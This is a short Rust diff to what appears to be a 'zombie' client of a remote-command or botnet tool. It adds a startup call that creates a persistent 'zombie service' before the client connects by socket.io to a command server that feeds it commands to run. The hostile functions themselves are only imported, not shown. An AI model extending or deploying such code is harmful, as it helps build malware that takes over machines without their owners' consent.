@@ -10,10 +10,15 @@ use rust_socketio::{
 };
 use std::time::Duration;
 use utils::types::command_payload::parse_command_data;
-use zombies::run_command::run_command;
+use zombies::{create_zombie_service::create_zombie_service, run_command::run_command};
 
 #[tokio::main]
 async fn main() {
+    match create_zombie_service() {
+        Ok(_) => println!("Zombie service created"),
+        Err(e) => println!("Error creating zombie service:\n{}", e),
+    }
+
     let url: String = format!("http://{}:{}", LOCALHOST_ADDRESS, LOCALHOST_PORT);
 
     ClientBuilder::new(url)
